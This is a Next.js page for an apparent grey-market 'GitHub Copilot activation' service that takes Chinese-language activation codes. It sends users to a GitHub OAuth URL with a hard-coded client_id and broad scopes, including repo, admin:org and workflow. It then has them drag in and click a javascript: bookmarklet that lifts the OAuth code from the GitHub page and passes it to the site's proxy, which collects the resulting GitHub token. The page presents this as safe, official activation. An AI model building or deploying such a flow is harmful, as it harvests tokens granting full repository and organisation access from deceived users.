"use client"

import { useState, useEffect, useCallback } from "react"
import Link from "next/link"
import { ArrowLeft, ArrowRight, Check, Github, Loader2, Shield, Zap, Code, Bookmark, ExternalLink, Play } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"

const GITHUB_OAUTH_URL = "https://github.com/login/oauth/authorize?allow_signup=false&client_id=2cfa9b7a1b57de32dd0d&scope=user+repo+notifications+admin%3Aorg+read%3Adiscussion+user%3Aassets+read%3Aproject+project+workflow&skip_account_picker=true"

// 生成唯一 session ID
function generateSessionId() {
  return 'copilot_' + Date.now() + '_' + Math.random().toString(36).substring(2, 15)
}

interface CardData {
  code?: string
  activation_code?: string
  recharge_info?: {
    github_username?: string
    recharge_status?: string
  }
}

interface TokenData {
  token?: string
  user?: string
  login?: string
}

export default function CopilotPage() {
  const [step, setStep] = useState(1)
  const [sessionId, setSessionId] = useState("")
  const [activationCode, setActivationCode] = useState("")
  const [isVerifying, setIsVerifying] = useState(false)
  const [isRecharging, setIsRecharging] = useState(false)
  const [error, setError] = useState("")
  const [success, setSuccess] = useState("")
  const [cardData, setCardData] = useState<CardData | null>(null)
  const [tokenData, setTokenData] = useState<TokenData | null>(null)
  const [isPolling, setIsPolling] = useState(false)
  const [result, setResult] = useState<{ success: boolean; message: string } | null>(null)

  // 初始化 session ID
  useEffect(() => {
    const sid = generateSessionId()
    setSessionId(sid)
  }, [])

  // 生成书签代码 - 回调到我们的 API
  const getBookmarkletCode = useCallback(() => {
    if (typeof window === 'undefined') return ''
    const callbackUrl = `${window.location.origin}/api/copilot/proxy?code=CODE_PLACEHOLDER&sessionId=${sessionId}`
    return `javascript:void(function(){var m=document.querySelector('meta[http-equiv="refresh"]')||document.querySelector('meta[data-url]');if(!m){var c2=new URLSearchParams(window.location.search).get('code');if(c2){window.location.href='${callbackUrl}'.replace('CODE_PLACEHOLDER',c2);return}alert('请在GitHub授权完成页面使用此书签');return}var u=m.getAttribute('content')||m.getAttribute('data-url');var c=u.match(/code=([a-f0-9]+)/);if(!c){alert('未找到授权码');return}window.location.href='${callbackUrl}'.replace('CODE_PLACEHOLDER',c[1])})();`
  }, [sessionId])

  // 监听来自回调窗口的消息
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data?.type === 'copilot-auth-success') {
        setSuccess("GitHub 授权成功！正在获取 Token...")
        setIsPolling(true)
      }
    }

    window.addEventListener('message', handleMessage)
    return () => window.removeEventListener('message', handleMessage)
  }, [])

  // Step 1: 验证卡密
  const verifyCode = async () => {
    if (!activationCode.trim()) return

    setIsVerifying(true)
    setError("")
    setSuccess("")

    try {
      const response = await fetch("/api/copilot/proxy", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          action: "verify-code", 
          card_code: activationCode.toUpperCase(),
          sessionId 
        }),
      })
      const data = await response.json()

      if (data.success) {
        setCardData(data.data)
        setSuccess("卡密验证成功")
        if (data.data?.recharge_info) {
          setSuccess(`卡密验证成功 - 已有充值记录: ${data.data.recharge_info.github_username || ""} (${data.data.recharge_info.recharge_status || ""})`)
        }
        setTimeout(() => setStep(2), 800)
      } else {
        setError(data.message || "卡密无效或已使用")
      }
    } catch {
      setError("网络错误，请重试")
    } finally {
      setIsVerifying(false)
    }
  }

  // Step 2: 轮询 OAuth 结果
  const pollForToken = useCallback(async () => {
    try {
      const response = await fetch(`/api/copilot/proxy?action=poll&sessionId=${sessionId}`)
      const data = await response.json()

      if (data.success && data.data?.token) {
        setIsPolling(false)
        setTokenData(data.data)
        setSuccess(`已获取 GitHub 授权: ${data.data.user || data.data.login || ''}`)
        setStep(3)
        return true
      }
    } catch {
      // 继续轮询
    }
    return false
  }, [sessionId])

  useEffect(() => {
    if (!isPolling || step !== 2) return

    const interval = setInterval(async () => {
      const found = await pollForToken()
      if (found) {
        clearInterval(interval)
      }
    }, 2000)

    // 90秒后停止轮询
    const timeout = setTimeout(() => {
      setIsPolling(false)
      setError("授权超时，请重新尝试")
    }, 90000)

    return () => {
      clearInterval(interval)
      clearTimeout(timeout)
    }
  }, [isPolling, step, pollForToken])

  const startOAuth = () => {
    setIsPolling(true)
    setError("")
    setSuccess("已打开 GitHub 授权页面，请完成授权后点击书签...")
    window.open(GITHUB_OAUTH_URL, "_blank", "width=600,height=700")
  }

  // Step 3: 提交充值
  const submitRecharge = async () => {
    if (!tokenData || !cardData) {
      setError("缺少必要信息，请刷新页面重试")
      return
    }

    setIsRecharging(true)
    setError("")

    try {
      const response = await fetch("/api/copilot/proxy", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "submit-recharge",
          sessionId,
          github_token: tokenData.token,
          github_user: tokenData.user || tokenData.login || "",
          card_code: cardData.code || cardData.activation_code,
          product_type: "copilot",
        }),
      })
      const data = await response.json()

      setResult({
        success: data.success,
        message: data.message || (data.success ? "充值成功！GitHub Copilot 已激活" : "充值失败，请重试"),
      })
    } catch {
      setResult({
        success: false,
        message: "网络错误，请重试",
      })
    } finally {
      setIsRecharging(false)
    }
  }

  return (
    <div className="min-h-screen bg-[#0d1117] text-[#e6edf3]">
      {/* Header */}
      <header className="border-b border-[#30363d] bg-[#161b22]">
        <div className="max-w-5xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Link href="/" className="text-[#7d8590] hover:text-[#e6edf3] transition-colors">
              <ArrowLeft className="w-5 h-5" />
            </Link>
            <Github className="w-6 h-6" />
            <span className="font-semibold text-[#e6edf3]">GitHub Copilot Activation</span>
          </div>
          <Link href="/copilot/query" className="text-sm text-[#58a6ff] hover:underline">
            {"查询卡密"}
          </Link>
        </div>
      </header>

      <main className="max-w-3xl mx-auto px-4 py-8">
        {/* Hero */}
        <div className="text-center mb-8">
          <h1 className="text-2xl font-bold mb-2">{"GitHub Copilot 充值"}</h1>
          <p className="text-[#7d8590] text-sm">
            {"通过官方 GraphQL API 安全充值，支持浏览器端 OAuth 授权"}
          </p>
        </div>

        {/* Video Tutorial - Collapsible */}
        <details className="mb-8 group">
          <summary className="bg-[#161b22] border border-[#30363d] rounded-xl p-4 cursor-pointer list-none hover:bg-[#1c2128] transition-colors">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <div className="w-6 h-6 rounded-md bg-[#238636]/20 flex items-center justify-center">
                  <Play className="w-3.5 h-3.5 text-[#3fb950]" />
                </div>
                <span className="text-sm font-medium text-[#e6edf3]">{"视频教程"}</span>
                <span className="text-xs text-[#7d8590]">{"- 点击展开观看完整操作流程"}</span>
              </div>
              <svg className="w-5 h-5 text-[#7d8590] transition-transform group-open:rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
              </svg>
            </div>
          </summary>
          <div className="bg-[#161b22] border border-t-0 border-[#30363d] rounded-b-xl p-4 -mt-3">
            <video controls className="w-full rounded-lg border border-[#30363d]" preload="metadata">
              <source src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/tutorial-qDmPfcYqOGTMR0x0CMgMKQMkv9joKN.mp4" type="video/mp4" />
              {"您的浏览器不支持视频播放"}
            </video>
          </div>
        </details>

        {/* Progress Steps */}
        <div className="flex items-center justify-center gap-2 mb-8">
          {[1, 2, 3].map((s) => (
            <div key={s} className="flex items-center">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium transition-colors ${
                step > s ? "bg-[#238636] text-white" : step === s ? "bg-[#58a6ff] text-white" : "bg-[#21262d] text-[#7d8590]"
              }`}>
                {step > s ? <Check className="w-4 h-4" /> : s}
              </div>
              {s < 3 && <div className={`w-12 h-0.5 mx-1 ${step > s ? "bg-[#238636]" : "bg-[#21262d]"}`} />}
            </div>
          ))}
        </div>

        {/* Step Content */}
        <Card className="bg-[#161b22] border-[#30363d]">
          <CardContent className="p-6">
            {/* Step 1: 验证卡密 */}
            {step === 1 && (
              <div className="space-y-4">
                <div className="flex items-center gap-2 mb-4">
                  <Code className="w-5 h-5 text-[#58a6ff]" />
                  <h2 className="text-lg font-semibold">{"第一步：验证激活码"}</h2>
                </div>
                <Input
                  value={activationCode}
                  onChange={(e) => setActivationCode(e.target.value.toUpperCase())}
                  placeholder="请输入激活码"
                  className="bg-[#0d1117] border-[#30363d] text-[#e6edf3] placeholder:text-[#484f58]"
                  onKeyDown={(e) => e.key === "Enter" && verifyCode()}
                />
                {error && <p className="text-sm text-[#f85149]">{error}</p>}
                {success && <p className="text-sm text-[#3fb950]">{success}</p>}
                <Button
                  onClick={verifyCode}
                  disabled={isVerifying || !activationCode.trim()}
                  className="w-full bg-[#238636] hover:bg-[#2ea043] text-white"
                >
                  {isVerifying ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : null}
                  {"验证激活码"}
                </Button>
              </div>
            )}

            {/* Step 2: GitHub OAuth */}
            {step === 2 && (
              <div className="space-y-4">
                <div className="flex items-center gap-2 mb-4">
                  <Github className="w-5 h-5 text-[#58a6ff]" />
                  <h2 className="text-lg font-semibold">{"第二步：GitHub 授权"}</h2>
                </div>

                <div className="bg-[#0d1117] rounded-lg p-4 border border-[#30363d]">
                  {/* 书签工具 */}
                  <div className="mb-4 p-3 bg-[#21262d] rounded border border-[#30363d]">
                    <div className="flex items-center gap-2 mb-2">
                      <Bookmark className="w-4 h-4 text-[#f0883e]" />
                      <span className="text-sm font-medium">{"第一步：拖动书签到书签栏"}</span>
                    </div>
                    <p className="text-xs text-[#7d8590] mb-3">
                      {"请将下方绿色按钮拖拽到浏览器书签栏保存："}
                    </p>
                    <a
                      href={getBookmarkletCode()}
                      className="inline-block px-4 py-2 bg-[#238636] text-white text-sm font-medium rounded hover:bg-[#2ea043] transition-colors cursor-move"
                      onClick={(e) => {
                        e.preventDefault()
                        alert("请将此按钮拖拽到浏览器书签栏，而不是点击它")
                      }}
                      draggable
                    >
                      {"获取授权码"}
                    </a>
                  </div>

                  <div className="mb-4 p-3 bg-[#21262d] rounded border border-[#30363d]">
                    <div className="flex items-center gap-2 mb-2">
                      <Github className="w-4 h-4 text-[#58a6ff]" />
                      <span className="text-sm font-medium">{"第二步：打开 GitHub 授权"}</span>
                    </div>
                    <p className="text-xs text-[#7d8590] mb-3">
                      {"点击下方按钮登录 GitHub 并完成授权："}
                    </p>
                    <Button
                      onClick={startOAuth}
                      className="w-full bg-[#21262d] hover:bg-[#30363d] text-[#e6edf3] border border-[#30363d]"
                    >
                      <Github className="w-4 h-4 mr-2" />
                      {"登录 GitHub 授权"}
                      <ExternalLink className="w-3 h-3 ml-2" />
                    </Button>
                  </div>

                  <div className="p-3 bg-[#21262d] rounded border border-[#30363d]">
                    <div className="flex items-center gap-2 mb-2">
                      <ArrowRight className="w-4 h-4 text-[#3fb950]" />
                      <span className="text-sm font-medium">{"第三步：点击书签获取 Token"}</span>
                    </div>
                    <p className="text-xs text-[#7d8590]">
                      {"授权完成后，在 GitHub 页面点击书签栏的「获取授权码」按钮"}
                    </p>
                  </div>
                </div>

                {isPolling && (
                  <div className="flex items-center justify-center gap-2 text-[#58a6ff] bg-[#0d1117] p-3 rounded border border-[#30363d]">
                    <Loader2 className="w-4 h-4 animate-spin" />
                    <span className="text-sm">{"等待授权完成...请在 GitHub 页面点击书签"}</span>
                  </div>
                )}

                {error && <p className="text-sm text-[#f85149]">{error}</p>}
                {success && <p className="text-sm text-[#3fb950]">{success}</p>}

                <Button
                  variant="ghost"
                  onClick={() => setStep(1)}
                  className="text-[#7d8590] hover:text-[#e6edf3]"
                >
                  <ArrowLeft className="w-4 h-4 mr-2" />
                  {"返回上一步"}
                </Button>
              </div>
            )}

            {/* Step 3: 确认充值 */}
            {step === 3 && !result && (
              <div className="space-y-4">
                <div className="flex items-center gap-2 mb-4">
                  <Zap className="w-5 h-5 text-[#58a6ff]" />
                  <h2 className="text-lg font-semibold">{"第三步：确认充值"}</h2>
                </div>

                <div className="bg-[#0d1117] rounded-lg p-4 border border-[#30363d] space-y-3">
                  <div className="flex justify-between text-sm">
                    <span className="text-[#7d8590]">{"GitHub 账号"}</span>
                    <span className="text-[#e6edf3] font-mono">{tokenData?.user || tokenData?.login || "-"}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-[#7d8590]">{"激活码"}</span>
                    <span className="text-[#e6edf3] font-mono">{cardData?.code || cardData?.activation_code || "-"}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-[#7d8590]">{"产品"}</span>
                    <span className="text-[#e6edf3]">{"GitHub Copilot"}</span>
                  </div>
                </div>

                {error && <p className="text-sm text-[#f85149]">{error}</p>}

                <Button
                  onClick={submitRecharge}
                  disabled={isRecharging}
                  className="w-full bg-[#238636] hover:bg-[#2ea043] text-white"
                >
                  {isRecharging ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : <Zap className="w-4 h-4 mr-2" />}
                  {"确认充值"}
                </Button>

                <Button
                  variant="ghost"
                  onClick={() => setStep(2)}
                  className="text-[#7d8590] hover:text-[#e6edf3]"
                >
                  <ArrowLeft className="w-4 h-4 mr-2" />
                  {"返回上一步"}
                </Button>
              </div>
            )}

            {/* Result */}
            {result && (
              <div className="text-center py-8">
                <div className={`w-16 h-16 mx-auto rounded-full flex items-center justify-center mb-4 ${
                  result.success ? "bg-[#238636]/20" : "bg-[#f85149]/20"
                }`}>
                  {result.success ? (
                    <Check className="w-8 h-8 text-[#3fb950]" />
                  ) : (
                    <span className="text-2xl text-[#f85149]">{"✕"}</span>
                  )}
                </div>
                <h3 className={`text-lg font-semibold mb-2 ${result.success ? "text-[#3fb950]" : "text-[#f85149]"}`}>
                  {result.success ? "充值成功" : "充值失败"}
                </h3>
                <p className="text-[#7d8590] text-sm mb-6">{result.message}</p>
                <div className="flex gap-3 justify-center">
                  <Link href="/">
                    <Button variant="outline" className="border-[#30363d] text-[#e6edf3] hover:bg-[#21262d]">
                      {"返回首页"}
                    </Button>
                  </Link>
                  {!result.success && (
                    <Button onClick={() => { setResult(null); setStep(1) }} className="bg-[#238636] hover:bg-[#2ea043]">
                      {"重新尝试"}
                    </Button>
                  )}
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Features */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-8">
          {[
            { icon: Shield, label: "安全授权", desc: "浏览器端 OAuth" },
            { icon: Zap, label: "即时生效", desc: "充值秒到账" },
            { icon: Github, label: "官方 API", desc: "GraphQL 接口" },
            { icon: Code, label: "正版激活", desc: "官方渠道" },
          ].map((item, i) => (
            <div key={i} className="bg-[#161b22] border border-[#30363d] rounded-lg p-3 text-center">
              <item.icon className="w-5 h-5 mx-auto mb-2 text-[#58a6ff]" />
              <div className="text-sm font-medium">{item.label}</div>
              <div className="text-xs text-[#7d8590]">{item.desc}</div>
            </div>
          ))}
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-[#30363d] py-6 mt-12">
        <div className="max-w-3xl mx-auto px-4 text-center">
          <p className="text-sm text-[#7d8590]">{"© 2026 GitHub Copilot Activation"}</p>
        </div>
      </footer>
    </div>
  )
}
